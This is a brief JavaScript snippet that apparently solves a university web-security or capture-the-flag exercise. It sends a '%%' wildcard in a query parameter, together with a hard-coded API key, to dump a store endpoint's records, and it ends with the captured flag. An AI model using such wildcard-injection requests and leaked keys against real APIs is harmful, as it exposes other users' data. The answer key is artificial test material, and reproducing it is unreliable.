// Login as xiandew

// Run in browser console
$.ajax({
    url: "http://assignment-hermes.unimelb.life/api/store.php?name=%%",
    type: "get",
    headers: { apikey: "7d302c13-a286-11eb-a547-0242ac110002" }
}).done((data) => {
    console.log(data)
});

// FLAG{Welcome_to_the_wild_wild_web!}